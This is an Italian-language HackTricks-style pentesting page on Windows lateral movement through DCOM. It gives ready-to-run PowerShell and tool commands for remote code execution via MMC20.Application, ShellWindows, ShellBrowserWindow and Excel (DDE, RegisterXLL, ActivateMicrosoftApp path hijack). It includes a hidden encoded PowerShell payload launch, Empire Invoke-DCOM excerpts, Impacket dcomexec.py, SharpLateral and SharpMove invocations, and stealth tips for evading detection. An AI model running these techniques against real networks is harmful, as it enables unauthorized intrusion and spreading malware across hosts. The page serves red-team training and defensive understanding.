# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Il lateral movement tramite DCOM è interessante perché riutilizza server COM esistenti esposti tramite RPC/DCOM invece di creare un servizio o un'attività pianificata. In pratica, ciò significa che la connessione iniziale solitamente inizia sulla porta TCP/135 e poi passa a porte RPC elevate assegnate dinamicamente.

## Prerequisiti e insidie

- Di solito è necessario un contesto di amministratore locale sul target e il server COM remoto deve consentire l'avvio/l'attivazione remota.
- Dal **14 marzo 2023**, Microsoft applica il DCOM hardening sui sistemi supportati. I client meno recenti che richiedono un livello di autenticazione basso per l'attivazione possono fallire, a meno che non negozino almeno `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. I client Windows moderni vengono solitamente aggiornati automaticamente, quindi gli strumenti attuali normalmente continuano a funzionare.<sup>[[3]](#references)</sup>
- L'esecuzione DCOM manuale o tramite script richiede generalmente TCP/135 più l'intervallo di porte RPC dinamiche del target. Se si utilizza `dcomexec.py` di Impacket e si desidera ricevere l'output dei comandi, di solito è necessario anche l'accesso SMB a `ADMIN$` (o a un'altra share con permessi di lettura/scrittura).
- Se RPC/DCOM funziona ma SMB è bloccato, `dcomexec.py -nooutput` può comunque essere utile per l'esecuzione blind.

Controlli rapidi:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Per ulteriori informazioni su questa tecnica, consultare il post originale su [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Gli oggetti Distributed Component Object Model (DCOM) offrono una funzionalità interessante per le interazioni basate sulla rete con gli oggetti. Microsoft fornisce una documentazione completa sia per DCOM sia per Component Object Model (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). È possibile recuperare un elenco delle applicazioni DCOM utilizzando il comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
L'oggetto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), consente di eseguire tramite script le operazioni degli snap-in MMC. In particolare, questo oggetto contiene un metodo `ExecuteShellCommand` in `Document.ActiveView`. Ulteriori informazioni su questo metodo sono disponibili [qui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Verifica il suo funzionamento eseguendo:

Questa funzionalità consente l'esecuzione di comandi sulla rete tramite un'applicazione DCOM. Per interagire con DCOM da remoto come admin, è possibile utilizzare PowerShell nel modo seguente:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. È quindi possibile richiamare il metodo ExecuteShellCommand per eseguire un processo sull'host remoto. Il processo prevede i seguenti passaggi:

Verifica i metodi:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Ottenere RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
L'ultimo argomento è lo stile della finestra. `7` mantiene la finestra minimizzata. Dal punto di vista operativo, l'esecuzione basata su MMC porta comunemente alla creazione di un processo remoto `mmc.exe` che avvia il payload, a differenza degli oggetti basati su Explorer descritti di seguito.

## ShellWindows & ShellBrowserWindow

**Per ulteriori informazioni su questa tecnica, consulta il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

È stato rilevato che l'oggetto **MMC20.Application** non dispone di "LaunchPermissions" espliciti e utilizza per impostazione predefinita autorizzazioni che consentono l'accesso agli Administrators. Per ulteriori dettagli, è possibile consultare [questa discussione](https://twitter.com/tiraniddo/status/817532039771525120); si consiglia inoltre di utilizzare OleView .NET di [@tiraniddo](https://twitter.com/tiraniddo) per filtrare gli oggetti privi di Launch Permission espliciti.

Sono stati evidenziati due oggetti specifici, `ShellBrowserWindow` e `ShellWindows`, poiché privi di Launch Permissions espliciti. L'assenza di una voce di registro `LaunchPermission` in `HKCR:\AppID\{guid}` indica l'assenza di autorizzazioni esplicite.

Rispetto a `MMC20.Application`, questi oggetti sono spesso più discreti dal punto di vista dell'OPSEC, poiché il comando finisce comunemente per essere un processo figlio di `explorer.exe` sull'host remoto invece che di `mmc.exe`.

### ShellWindows

Per `ShellWindows`, che non dispone di un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` consentono di creare un'istanza dell'oggetto utilizzando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID di `ShellWindows`. Una volta creata l'istanza, è possibile interagire tramite il metodo `WindowsShell.Item`, arrivando all'invocazione di metodi come `Document.Application.ShellExecute`.

Sono stati forniti comandi PowerShell di esempio per creare un'istanza dell'oggetto ed eseguire comandi da remoto:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` è simile, ma puoi istanziarlo direttamente tramite il suo CLSID e fare pivot verso `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement con oggetti DCOM di Excel

Il Lateral Movement può essere ottenuto sfruttando gli oggetti DCOM di Excel. Per informazioni dettagliate, è consigliabile leggere la discussione sull'utilizzo di Excel DDE per il Lateral Movement tramite DCOM sul [blog di Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Il progetto Empire fornisce uno script PowerShell che dimostra l'utilizzo di Excel per l'esecuzione remota del codice (RCE) manipolando gli oggetti DCOM. Di seguito sono riportati estratti dello script disponibile sul [repository GitHub di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), che mostrano diversi metodi per abusare di Excel per ottenere RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Ricerche recenti hanno ampliato quest'area con il metodo `ActivateMicrosoftApp()` di `Excel.Application`. L'idea chiave è che Excel può tentare di avviare applicazioni Microsoft legacy come FoxPro, Schedule Plus o Project cercandole nel `PATH` del sistema. Se un operatore può posizionare un payload con uno dei nomi previsti in una posizione scrivibile inclusa nel `PATH` del target, Excel lo eseguirà.<sup>[[4]](#references)</sup>

Requisiti per questa variante:

- Admin locale sul target
- Excel installato sul target
- Possibilità di scrivere un payload in una directory scrivibile inclusa nel `PATH` del target

Esempio pratico che sfrutta la ricerca di FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Se l'host attaccante non ha registrato il ProgID locale `Excel.Application`, istanzia l'oggetto remoto utilizzando invece il CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Valori osservati come abusati nella pratica:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automation Tools for Lateral Movement

Vengono evidenziati due strumenti per automatizzare queste tecniche:

- **Invoke-DCOM.ps1**: uno script PowerShell fornito dal progetto Empire che semplifica l'invocazione di diversi metodi per eseguire codice su macchine remote. Questo script è disponibile nel repository GitHub di Empire.

- **SharpLateral**: uno strumento progettato per eseguire codice in modalità remota, utilizzabile con il comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Strumenti automatici

- Lo script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) consente di invocare facilmente tutti i metodi commentati per eseguire codice su altre macchine.
- È possibile utilizzare `dcomexec.py` di Impacket per eseguire comandi su sistemi remoti tramite DCOM. Le build attuali supportano `ShellWindows`, `ShellBrowserWindow` e `MMC20`, utilizzando per impostazione predefinita `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Potresti anche usare [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Potresti anche usare [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Riferimenti

- [1] [Lateral Movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Gestire le modifiche per la vulnerabilità Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: sfruttare la potenza dell'applicazione DCOM Excel](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Sfruttare Excel DDE per il lateral movement tramite DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

{{#include ../../banners/hacktricks-training.md}}
